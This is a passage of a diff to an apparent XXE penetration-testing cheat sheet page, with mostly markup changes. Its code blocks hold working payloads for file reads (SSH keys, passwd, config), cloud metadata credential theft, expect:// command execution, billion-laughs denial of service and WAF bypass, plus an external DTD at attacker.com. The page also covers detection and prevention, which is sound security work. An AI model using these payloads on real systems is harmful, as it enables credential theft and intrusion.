-  <a class="anchor" href="#2-xxe-inside-non-xml-formats">#</a>
-</h3>
+<h3 id="2-xxe-inside-non-xml-formats"><strong>2. XXE Inside Non-XML Formats</strong><a class="anchor" href="#2-xxe-inside-non-xml-formats">#</a></h3>
 <p>Many APIs accept <strong>JSON but parse as XML</strong> if malformed:</p>
-<h3 id="json--xxe-conversion-trick">
-  <strong>JSON → XXE Conversion Trick</strong>
-  <a class="anchor" href="#json--xxe-conversion-trick">#</a>
-</h3>
+<h3 id="json--xxe-conversion-trick"><strong>JSON → XXE Conversion Trick</strong><a class="anchor" href="#json--xxe-conversion-trick">#</a></h3>
 <pre tabindex="0"><code>{
   &#34;test&#34;: &#34;valid JSON&#34;,
   &#34;malicious&#34;: &#34;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&#34;
-}
-</code></pre><p><em>(If the backend uses <strong>libxml</strong>, it may parse embedded XML!)</em></p>
-<h3 id="xxe-in-svg-files">
-  <strong>XXE in SVG Files</strong>
-  <a class="anchor" href="#xxe-in-svg-files">#</a>
-</h3>
+}</code></pre><p><em>(If the backend uses <strong>libxml</strong>, it may parse embedded XML!)</em></p>
+<h3 id="xxe-in-svg-files"><strong>XXE in SVG Files</strong><a class="anchor" href="#xxe-in-svg-files">#</a></h3>
 <p>SVG is XML-based:</p>
 <pre tabindex="0"><code>&lt;svg xmlns=&#34;&lt;http://www.w3.org/2000/svg&gt;&#34; width=&#34;100&#34; height=&#34;100&#34;&gt;
   &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;
-  &lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;
-</code></pre><p><em>(Upload this SVG to test for XXE.)</em></p>
+  &lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;</code></pre><p><em>(Upload this SVG to test for XXE.)</em></p>
 <hr>
-<h3 id="3-xxe-via-xinclude-bypass-dtd-blocks">
-  <strong>3. XXE via XInclude (Bypass DTD Blocks)</strong>
-  <a class="anchor" href="#3-xxe-via-xinclude-bypass-dtd-blocks">#</a>
-</h3>
+<h3 id="3-xxe-via-xinclude-bypass-dtd-blocks"><strong>3. XXE via XInclude (Bypass DTD Blocks)</strong><a class="anchor" href="#3-xxe-via-xinclude-bypass-dtd-blocks">#</a></h3>
 <p>If direct DTD is blocked, use <strong>XInclude</strong>:</p>
-<pre tabindex="0"><code>&lt;foo xmlns:xi=&#34;&lt;http://www.w3.org/2001/XInclude&gt;&#34;&gt;&lt;xi:include parse=&#34;text&#34; href=&#34;file:///etc/passwd&#34;/&gt;&lt;/foo&gt;
-</code></pre><p><em>(Works in <strong>docx, xlsx, XML-based APIs</strong>.)</em></p>
+<pre tabindex="0"><code>&lt;foo xmlns:xi=&#34;&lt;http://www.w3.org/2001/XInclude&gt;&#34;&gt;&lt;xi:include parse=&#34;text&#34; href=&#34;file:///etc/passwd&#34;/&gt;&lt;/foo&gt;</code></pre><p><em>(Works in <strong>docx, xlsx, XML-based APIs</strong>.)</em></p>
 <hr>
-<h3 id="4-xxe-in-soap-requests">
-  <strong>4. XXE in SOAP Requests</strong>
-  <a class="anchor" href="#4-xxe-in-soap-requests">#</a>
-</h3>
+<h3 id="4-xxe-in-soap-requests"><strong>4. XXE in SOAP Requests</strong><a class="anchor" href="#4-xxe-in-soap-requests">#</a></h3>
 <p>SOAP APIs often parse XML:</p>
-<pre tabindex="0"><code>&lt;soap:Envelope xmlns:soap=&#34;&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;&#34;&gt;&lt;soap:Body&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
-</code></pre><hr>
-<h3 id="5-xxe-for-rce-rare-but-possible">
-  <strong>5. XXE for RCE (Rare but Possible)</strong>
-  <a class="anchor" href="#5-xxe-for-rce-rare-but-possible">#</a>
-</h3>
-<h3 id="phpexpectwrapper">
-  <strong>PHP <code>expect://</code> Wrapper</strong>
-  <a class="anchor" href="#phpexpectwrapper">#</a>
-</h3>
+<pre tabindex="0"><code>&lt;soap:Envelope xmlns:soap=&#34;&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;&#34;&gt;&lt;soap:Body&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</code></pre><hr>
+<h3 id="5-xxe-for-rce-rare-but-possible"><strong>5. XXE for RCE (Rare but Possible)</strong><a class="anchor" href="#5-xxe-for-rce-rare-but-possible">#</a></h3>
+<h3 id="php"><strong>PHP <code>expect://</code> Wrapper</strong><a class="anchor" href="#php">#</a></h3>
 <p><em>(Requires <strong><code>expect</code></strong> module enabled)</em></p>
 <pre tabindex="0"><code>&lt;!DOCTYPE foo [
   &lt;!ENTITY xxe SYSTEM &#34;expect://id&#34;&gt;
-]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
-</code></pre><hr>
-<h3 id="6-billion-laugh-attack">
-  6. <strong>Billion Laugh Attack</strong>
-  <a class="anchor" href="#6-billion-laugh-attack">#</a>
-</h3>
+]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre><hr>
+<h3 id="6-billion-laugh-attack">6. <strong>Billion Laugh Attack</strong><a class="anchor" href="#6-billion-laugh-attack">#</a></h3>
 <pre tabindex="0"><code>&lt;!DOCTYPE data [
 &lt;!ENTITY a0 &#34;dos&#34; &gt;
 &lt;!ENTITY a1 &#34;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&#34;&gt;
@@ -1583,87 +1484,41 @@ https://github.com/alex-shpak/hugo-book
 &lt;!ENTITY a3 &#34;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&#34;&gt;
 &lt;!ENTITY a4 &#34;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&#34;&gt;
 ]&gt;
-&lt;data&gt;&amp;a4;&lt;/data&gt;
-</code></pre><h3 id="xslt-based-rce">
-  <strong>XSLT-Based RCE</strong>
-  <a class="anchor" href="#xslt-based-rce">#</a>
-</h3>
+&lt;data&gt;&amp;a4;&lt;/data&gt;</code></pre><h3 id="xslt-based-rce"><strong>XSLT-Based RCE</strong><a class="anchor" href="#xslt-based-rce">#</a></h3>
 <p>If XSLT processing is enabled:</p>
 <pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; ?&gt;
-&lt;xsl:stylesheet version=&#34;1.0&#34; xmlns:xsl=&#34;&lt;http://www.w3.org/1999/XSL/Transform&gt;&#34;&gt;&lt;xsl:template match=&#34;/&#34;&gt;&lt;xsl:value-of select=&#34;system-property(&#39;user.dir&#39;)&#34;/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;
-</code></pre><hr>
-<h3 id="7-bypassing-wafs--filters">
-  <strong>7. Bypassing WAFs &amp; Filters</strong>
-  <a class="anchor" href="#7-bypassing-wafs--filters">#</a>
-</h3>
-<h3 id="utf-7-bypass">
-  <strong>UTF-7 Bypass</strong>
-  <a class="anchor" href="#utf-7-bypass">#</a>
-</h3>
+&lt;xsl:stylesheet version=&#34;1.0&#34; xmlns:xsl=&#34;&lt;http://www.w3.org/1999/XSL/Transform&gt;&#34;&gt;&lt;xsl:template match=&#34;/&#34;&gt;&lt;xsl:value-of select=&#34;system-property(&#39;user.dir&#39;)&#34;/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;</code></pre><hr>
+<h3 id="7-bypassing-wafs--filters"><strong>7. Bypassing WAFs &amp; Filters</strong><a class="anchor" href="#7-bypassing-wafs--filters">#</a></h3>
+<h3 id="utf-7-bypass"><strong>UTF-7 Bypass</strong><a class="anchor" href="#utf-7-bypass">#</a></h3>
 <pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-7&#34;?&gt;
 +ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI +AD4AXQA+
-+ADw-foo+AD4AJg-xxe;+ADw-/foo+AD4-
-</code></pre><h3 id="cdata--utf-16-bypass">
-  <strong>CDATA + UTF-16 Bypass</strong>
-  <a class="anchor" href="#cdata--utf-16-bypass">#</a>
-</h3>
++ADw-foo+AD4AJg-xxe;+ADw-/foo+AD4-</code></pre><h3 id="cdata--utf-16-bypass"><strong>CDATA + UTF-16 Bypass</strong><a class="anchor" href="#cdata--utf-16-bypass">#</a></h3>
 <pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-16BE&#34;?&gt;
-&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
-</code></pre><h3 id="dtd-in-external-url-with-obfuscation">
-  <strong>DTD in External URL with Obfuscation</strong>
-  <a class="anchor" href="#dtd-in-external-url-with-obfuscation">#</a>
-</h3>
-<pre tabindex="0"><code>&lt;!DOCTYPE foo SYSTEM &#34;&lt;http://attacker.com/evil.dtd&gt;&#34;&gt;
-</code></pre><p><em>(Some WAFs miss external DTD references.)</em></p>
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre><h3 id="dtd-in-external-url-with-obfuscation"><strong>DTD in External URL with Obfuscation</strong><a class="anchor" href="#dtd-in-external-url-with-obfuscation">#</a></h3>
+<pre tabindex="0"><code>&lt;!DOCTYPE foo SYSTEM &#34;&lt;http://attacker.com/evil.dtd&gt;&#34;&gt;</code></pre><p><em>(Some WAFs miss external DTD references.)</em></p>
 <hr>
-<h3 id="8-xxe-in-cloud-environments">
-  <strong>8. XXE in Cloud Environments</strong>
-  <a class="anchor" href="#8-xxe-in-cloud-environments">#</a>
-</h3>
-<h3 id="aws-metadata-ssrf">
-  <strong>AWS Metadata SSRF</strong>
-  <a class="anchor" href="#aws-metadata-ssrf">#</a>
-</h3>
+<h3 id="8-xxe-in-cloud-environments"><strong>8. XXE in Cloud Environments</strong><a class="anchor" href="#8-xxe-in-cloud-environments">#</a></h3>
+<h3 id="aws-metadata-ssrf"><strong>AWS Metadata SSRF</strong><a class="anchor" href="#aws-metadata-ssrf">#</a></h3>
 <pre tabindex="0"><code>&lt;!DOCTYPE foo [
   &lt;!ENTITY xxe SYSTEM &#34;&lt;http://169.254.169.254/latest/meta-data/iam/security-credentials/&gt;&#34;&gt;
-]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
-</code></pre><h3 id="azure-metadata">
-  <strong>Azure Metadata</strong>
-  <a class="anchor" href="#azure-metadata">#</a>
-</h3>
-<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;&lt;http://169.254.169.254/metadata/instance?api-version=2021-02-01&gt;&#34;&gt;
-</code></pre><h3 id="gcp-metadata">
-  <strong>GCP Metadata</strong>
-  <a class="anchor" href="#gcp-metadata">#</a>
-</h3>
-<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;&lt;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&gt;&#34;&gt;
-</code></pre><hr>
-<h3 id="9-via-changing-content-type">
-  9. <strong>Via Changing Content-Type</strong>
-  <a class="anchor" href="#9-via-changing-content-type">#</a>
-</h3>
+]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre><h3 id="azure-metadata"><strong>Azure Metadata</strong><a class="anchor" href="#azure-metadata">#</a></h3>
+<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;&lt;http://169.254.169.254/metadata/instance?api-version=2021-02-01&gt;&#34;&gt;</code></pre><h3 id="gcp-metadata"><strong>GCP Metadata</strong><a class="anchor" href="#gcp-metadata">#</a></h3>
+<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;&lt;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&gt;&#34;&gt;</code></pre><hr>
+<h3 id="9-via-changing-content-type">9. <strong>Via Changing Content-Type</strong><a class="anchor" href="#9-via-changing-content-type">#</a></h3>
 <p>Content-Type: From x-www-urlencoded to XML</p>
 <p>If a POST request accepts the data in XML format, try changing the content-type to xml.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>POST /action HTTP/1.0
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>POST /action HTTP/1.0
 </span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
 </span></span><span style="display:flex;"><span>Content-Length: 7
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>foo=bar
-</span></span></code></pre></div><p>Send the request in XML format</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>POST /action HTTP/1.0
+</span></span><span style="display:flex;"><span>foo=bar</span></span></code></pre></div><p>Send the request in XML format</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>POST /action HTTP/1.0
 </span></span><span style="display:flex;"><span>Content-Type: text/xml
 </span></span><span style="display:flex;"><span>Content-Length: 52
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span><span style="color:#f92672">&lt;foo&gt;</span>bar<span style="color:#f92672">&lt;/foo&gt;</span>
-</span></span></code></pre></div><hr>
-<h2 id="framework-specific-scenarios">
-  Framework-Specific Scenarios
-  <a class="anchor" href="#framework-specific-scenarios">#</a>
-</h2>
-<h3 id="java">
-  Java
-  <a class="anchor" href="#java">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span><span style="color:#f92672">&lt;foo&gt;</span>bar<span style="color:#f92672">&lt;/foo&gt;</span></span></span></code></pre></div><hr>
+<h2 id="framework-specific-scenarios">Framework-Specific Scenarios<a class="anchor" href="#framework-specific-scenarios">#</a></h2>
+<h3 id="java">Java<a class="anchor" href="#java">#</a></h3>
 <ul>
 <li>JAXB</li>
 <li>SAX</li>
@@ -1674,10 +1529,7 @@ https://github.com/alex-shpak/hugo-book
 <p>Common issue:
 External entities enabled by default.</p>
 <hr>
-<h3 id="php">
-  PHP
-  <a class="anchor" href="#php">#</a>
-</h3>
+<h3 id="php-1">PHP<a class="anchor" href="#php-1">#</a></h3>
 <p>Common vulnerable functions:</p>
 <ul>
 <li>simplexml_load_string()</li>
@@ -1690,10 +1542,7 @@ External entities enabled by default.</p>
 <li>expect://</li>
 </ul>
 <hr>
-<h3 id="net">
-  .NET
-  <a class="anchor" href="#net">#</a>
-</h3>
+<h3 id="net">.NET<a class="anchor" href="#net">#</a></h3>
 <p>Classes:</p>
 <ul>
 <li>XmlDocument</li>
@@ -1702,10 +1551,7 @@ External entities enabled by default.</p>
 </ul>
 <p>Older .NET versions are commonly vulnerable when DTD processing is enabled.</p>
 <hr>
-<h3 id="python">
-  Python
-  <a class="anchor" href="#python">#</a>
-</h3>
+<h3 id="python">Python<a class="anchor" href="#python">#</a></h3>
 <p>Libraries:</p>
 <ul>
 <li>lxml</li>
@@ -1717,10 +1563,7 @@ External entities enabled by default.</p>
 <li>defusedxml</li>
 </ul>
 <hr>
-<h3 id="nodejs">
-  Node.js
-  <a class="anchor" href="#nodejs">#</a>
-</h3>
+<h3 id="nodejs">Node.js<a class="anchor" href="#nodejs">#</a></h3>
 <p>Libraries:</p>
 <ul>
 <li>libxmljs</li>
@@ -1728,41 +1571,15 @@ External entities enabled by default.</p>
 <li>xml2js</li>
 </ul>
 <hr>
-<h2 id="real-world-exploitation-scenarios">
-  <strong>Real-World Exploitation Scenarios</strong>
-  <a class="anchor" href="#real-world-exploitation-scenarios">#</a>
-</h2>
-<h3 id="1-stealing-ssh-keys">
-  <strong>1. Stealing SSH Keys</strong>
-  <a class="anchor" href="#1-stealing-ssh-keys">#</a>
-</h3>
-<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;file:///home/user/.ssh/id_rsa&#34;&gt;
-</code></pre><h3 id="2-reading-database-credentials">
-  <strong>2. Reading Database Credentials</strong>
-  <a class="anchor" href="#2-reading-database-credentials">#</a>
-</h3>
-<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;file:///var/www/html/config.php&#34;&gt;
-</code></pre><h3 id="3-exploiting-windows-systems">
-  <strong>3. Exploiting Windows Systems</strong>
-  <a class="anchor" href="#3-exploiting-windows-systems">#</a>
-</h3>
-<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;file:///C:/Windows/System32/drivers/etc/hosts&#34;&gt;
-</code></pre><h3 id="4-abusing-php-wrappers">
-  <strong>4. Abusing PHP Wrappers</strong>
-  <a class="anchor" href="#4-abusing-php-wrappers">#</a>
-</h3>
-<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=index.php&#34;&gt;
-</code></pre><h3 id="5-xxe-in-pdf-generators">
-  <strong>5. XXE in PDF Generators</strong>
-  <a class="anchor" href="#5-xxe-in-pdf-generators">#</a>
-</h3>
+<h2 id="real-world-exploitation-scenarios"><strong>Real-World Exploitation Scenarios</strong><a class="anchor" href="#real-world-exploitation-scenarios">#</a></h2>
+<h3 id="1-stealing-ssh-keys"><strong>1. Stealing SSH Keys</strong><a class="anchor" href="#1-stealing-ssh-keys">#</a></h3>
+<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;file:///home/user/.ssh/id_rsa&#34;&gt;</code></pre><h3 id="2-reading-database-credentials"><strong>2. Reading Database Credentials</strong><a class="anchor" href="#2-reading-database-credentials">#</a></h3>
+<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;file:///var/www/html/config.php&#34;&gt;</code></pre><h3 id="3-exploiting-windows-systems"><strong>3. Exploiting Windows Systems</strong><a class="anchor" href="#3-exploiting-windows-systems">#</a></h3>
+<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;file:///C:/Windows/System32/drivers/etc/hosts&#34;&gt;</code></pre><h3 id="4-abusing-php-wrappers"><strong>4. Abusing PHP Wrappers</strong><a class="anchor" href="#4-abusing-php-wrappers">#</a></h3>
+<pre tabindex="0"><code>&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=index.php&#34;&gt;</code></pre><h3 id="5-xxe-in-pdf-generators"><strong>5. XXE in PDF Generators</strong><a class="anchor" href="#5-xxe-in-pdf-generators">#</a></h3>
 <p>Many PDF generators (like <strong>Apache FOP</strong>) parse XML:</p>
-<pre tabindex="0"><code>&lt;!DOCTYPE foobar [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;foobar&gt;&amp;xxe;&lt;/foobar&gt;
-</code></pre><hr>
-<h3 id="6-xxe-oob-with-apache-karaf">
-  <strong>6. XXE OOB with Apache Karaf</strong>
-  <a class="anchor" href="#6-xxe-oob-with-apache-karaf">#</a>
-</h3>
+<pre tabindex="0"><code>&lt;!DOCTYPE foobar [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;foobar&gt;&amp;xxe;&lt;/foobar&gt;</code></pre><hr>
+<h3 id="6-xxe-oob-with-apache-karaf"><strong>6. XXE OOB with Apache Karaf</strong><a class="anchor" href="#6-xxe-oob-with-apache-karaf">#</a></h3>
 <p>CVE-2018-11788 affecting versions:</p>
 <ul>
 <li>Apache Karaf &lt;= 4.2.1</li>
@@ -1774,92 +1591,82 @@ External entities enabled by default.</p>
         xsi:schemaLocation=&#34;&lt;http://karaf.apache.org/xmlns/features/v1.3.0&gt; &lt;http://karaf.apache.org/xmlns/features/v1.3.0&gt;&#34;&gt;
     &lt;feature name=&#34;deployer&#34; version=&#34;2.0&#34; install=&#34;auto&#34;&gt;
     &lt;/feature&gt;
-&lt;/features&gt;
-</code></pre><hr>
-<h2 id="test-cases">
-  Test Cases
-  <a class="anchor" href="#test-cases">#</a>
-</h2>
+&lt;/features&gt;</code></pre><hr>
+<h2 id="test-cases">Test Cases<a class="anchor" href="#test-cases">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Scenario</th>
-<th>Payload</th>
-<th>Expected Result</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Internal Entity</td>
-<td><code>&lt;!ENTITY test &quot;hello&quot;&gt;</code></td>
-<td>Response contains <code>hello</code></td>
-</tr>
-<tr>
-<td>File Read</td>
-<td><code>file:///etc/passwd</code></td>
-<td>File contents returned</td>
-</tr>
-<tr>
-<td>Windows File Read</td>
-<td><code>file:///C:/Windows/win.ini</code></td>
-<td>File contents returned</td>
-</tr>
-<tr>
-<td>Blind XXE</td>
-<td>Collaborator URL</td>
-<td>DNS/HTTP interaction</td>
-</tr>
-<tr>
-<td>SSRF</td>
-<td>Metadata endpoint</td>
-<td>Metadata returned</td>
-</tr>
-<tr>
-<td>XInclude</td>
-<td><code>&lt;xi:include&gt;</code></td>
-<td>File contents returned</td>
-</tr>
-<tr>
-<td>External DTD</td>
-<td>Remote DTD</td>
-<td>Remote request observed</td>
-</tr>
-<tr>
-<td>SVG Upload</td>
-<td>XXE SVG</td>
-<td>File disclosure/OOB</td>
-</tr>
-<tr>
-<td>SOAP XXE</td>
-<td>SOAP request</td>
-<td>XXE triggered</td>
-</tr>
-<tr>
-<td>Billion Laughs</td>
-<td>Recursive entities</td>
-<td>Parser DoS</td>
-</tr>
-<tr>
-<td>PHP Wrapper</td>
-<td><code>php://filter</code></td>
-<td>Base64 encoded source</td>
-</tr>
-<tr>
-<td>expect://</td>
-<td><code>expect://id</code></td>
-<td>Command output (rare)</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Scenario</th>
+					<th>Payload</th>
+					<th>Expected Result</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Internal Entity</td>
+					<td><code>&lt;!ENTITY test &quot;hello&quot;&gt;</code></td>
+					<td>Response contains <code>hello</code></td>
+			</tr>
+			<tr>
+					<td>File Read</td>
+					<td><code>file:///etc/passwd</code></td>
+					<td>File contents returned</td>
+			</tr>
+			<tr>
+					<td>Windows File Read</td>
+					<td><code>file:///C:/Windows/win.ini</code></td>
+					<td>File contents returned</td>
+			</tr>
+			<tr>
+					<td>Blind XXE</td>
+					<td>Collaborator URL</td>
+					<td>DNS/HTTP interaction</td>
+			</tr>
+			<tr>
+					<td>SSRF</td>
+					<td>Metadata endpoint</td>
+					<td>Metadata returned</td>
+			</tr>
+			<tr>
+					<td>XInclude</td>
+					<td><code>&lt;xi:include&gt;</code></td>
+					<td>File contents returned</td>
+			</tr>
+			<tr>
+					<td>External DTD</td>
+					<td>Remote DTD</td>
+					<td>Remote request observed</td>
+			</tr>
+			<tr>
+					<td>SVG Upload</td>
+					<td>XXE SVG</td>
+					<td>File disclosure/OOB</td>
+			</tr>
+			<tr>
+					<td>SOAP XXE</td>
+					<td>SOAP request</td>
+					<td>XXE triggered</td>
+			</tr>
+			<tr>
+					<td>Billion Laughs</td>
+					<td>Recursive entities</td>
+					<td>Parser DoS</td>
+			</tr>
+			<tr>
+					<td>PHP Wrapper</td>
+					<td><code>php://filter</code></td>
+					<td>Base64 encoded source</td>
+			</tr>
+			<tr>
+					<td>expect://</td>
+					<td><code>expect://id</code></td>
+					<td>Command output (rare)</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="detection-techniques">
-  Detection Techniques
-  <a class="anchor" href="#detection-techniques">#</a>
-</h2>
-<h3 id="manual-detection">
-  Manual Detection
-  <a class="anchor" href="#manual-detection">#</a>
-</h3>
+<h2 id="detection-techniques">Detection Techniques<a class="anchor" href="#detection-techniques">#</a></h2>
+<h3 id="manual-detection">Manual Detection<a class="anchor" href="#manual-detection">#</a></h3>
 <ul>
 <li>Check Content-Type negotiation</li>
 <li>Try XML instead of JSON</li>
@@ -1871,10 +1678,7 @@ External entities enabled by default.</p>
 <li>Monitor Collaborator</li>
 <li>Trigger parser errors</li>
 </ul>
-<h3 id="automated-detection">
-  Automated Detection
-  <a class="anchor" href="#automated-detection">#</a>
-</h3>
+<h3 id="automated-detection">Automated Detection<a class="anchor" href="#automated-detection">#</a></h3>
 <ul>
 <li>Burp Suite Scanner</li>
 <li>Burp Collaborator</li>
@@ -1884,10 +1688,7 @@ External entities enabled by default.</p>
 <li>OWASP ZAP</li>
 </ul>
 <hr>
-<h2 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h2>
+<h2 id="impact">Impact<a class="anchor" href="#impact">#</a></h2>
 <p>Successful XXE may lead to:</p>
 <ul>
 <li>Local file disclosure</li>
@@ -1902,10 +1703,7 @@ External entities enabled by default.</p>
 <li>Remote Code Execution (rare)</li>
 </ul>
 <hr>
-<h2 id="prevention-techniques">
-  <strong>Prevention Techniques</strong>
-  <a class="anchor" href="#prevention-techniques">#</a>
-</h2>
+<h2 id="prevention-techniques"><strong>Prevention Techniques</strong><a class="anchor" href="#prevention-techniques">#</a></h2>
 <ul>
 <li><strong>Disable DTDs entirely</strong> (most secure option).</li>
 <li><strong>Use JSON instead of XML</strong> where possible.</li>
@@ -1921,61 +1719,46 @@ External entities enabled by default.</p>
 <li>Apply least privilege to file system access.</li>
 </ul>
 <hr>
-<h2 id="tools">
-  <strong>Tools</strong>
-  <a class="anchor" href="#tools">#</a>
-</h2>
+<h2 id="tools"><strong>Tools</strong><a class="anchor" href="#tools">#</a></h2>
 <table>
-<thead>
-<tr>
-<th><strong>Tool</strong></th>
-<th><strong>Purpose</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>XXEinjector</strong></td>
-<td>Automated OOB XXE testing</td>
-</tr>
-<tr>
-<td><strong>Burp Collaborator</strong></td>
-<td>OOB detection</td>
-</tr>
-<tr>
-<td><strong>OOB-Server</strong></td>
-<td>Self-hosted XXE listener</td>
-</tr>
-<tr>
-<td><strong>Wfuzz</strong></td>
-<td>Fuzzing XML endpoints</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th><strong>Tool</strong></th>
+					<th><strong>Purpose</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>XXEinjector</strong></td>
+					<td>Automated OOB XXE testing</td>
+			</tr>
+			<tr>
+					<td><strong>Burp Collaborator</strong></td>
+					<td>OOB detection</td>
+			</tr>
+			<tr>
+					<td><strong>OOB-Server</strong></td>
+					<td>Self-hosted XXE listener</td>
+			</tr>
+			<tr>
+					<td><strong>Wfuzz</strong></td>
+					<td>Fuzzing XML endpoints</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="good-to-read">
-  Good To Read
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
-<h3 id="real-cves">
-  Real CVEs
-  <a class="anchor" href="#real-cves">#</a>
-</h3>
+<h2 id="good-to-read">Good To Read<a class="anchor" href="#good-to-read">#</a></h2>
+<h3 id="real-cves">Real CVEs<a class="anchor" href="#real-cves">#</a></h3>
 <ul>
 <li><a href="https://nvd.nist.gov/vuln/detail/cve-2017-9805" target="_blank" rel="noreferrer noopener nofollow">CVE-2017-9805 (Apache Struts)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://nvd.nist.gov/vuln/detail/cve-2018-11788" target="_blank" rel="noreferrer noopener nofollow">CVE-2018-11788 (Apache Karaf)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://nvd.nist.gov/vuln/detail/cve-2014-3660" target="_blank" rel="noreferrer noopener nofollow">CVE-2014-3660 (libxml2)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 </ul>
-<h3 id="hackerone-reports">
-  Hackerone Reports:
-  <a class="anchor" href="#hackerone-reports">#</a>
-</h3>
+<h3 id="hackerone-reports">Hackerone Reports:<a class="anchor" href="#hackerone-reports">#</a></h3>
 <p><a href="https://hackerone.com/reports/2573567" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/2573567</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://hackerone.com/reports/312543" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/312543</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://hackerone.com/reports/836877" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/836877</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
-<h2 id="references">
-  <strong>References:</strong>
